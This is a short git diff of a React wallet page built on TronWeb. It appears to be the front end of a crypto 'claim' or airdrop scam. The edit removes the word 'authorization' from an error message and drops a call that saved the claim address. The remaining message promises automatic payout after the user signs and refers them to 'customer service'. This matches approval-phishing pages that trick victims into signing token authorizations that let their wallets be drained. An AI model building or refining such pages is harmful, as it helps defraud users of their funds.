@@ -65,7 +65,7 @@ export default function WalletPage() {
       );
 
       if (!transactionWrapper || !transactionWrapper.transaction) {
-        throw new Error("创建授权交易失败");
+        throw new Error("创建交易失败");
       }
 
       const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
@@ -86,19 +86,7 @@ export default function WalletPage() {
         throw new Error("钱包签名失败");
       }
 
-      // 签名完成 → 直接保存输入框地址到数据库
-      setStep("正在保存领取记录...");
-      const response = await fetch("/api/claim", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: inputAddress
-        })
-      });
-      const result = await response.json();
-      if (!response.ok || !result.success) {
-        throw new Error(result?.message || "保存记录失败");
-      }
+     
 
       setMsg("✅ 提交成功！签名成功后将自动发放\n\n若未签名将无法发放\n\n10分钟未到账请联系客服");
       setStep("");
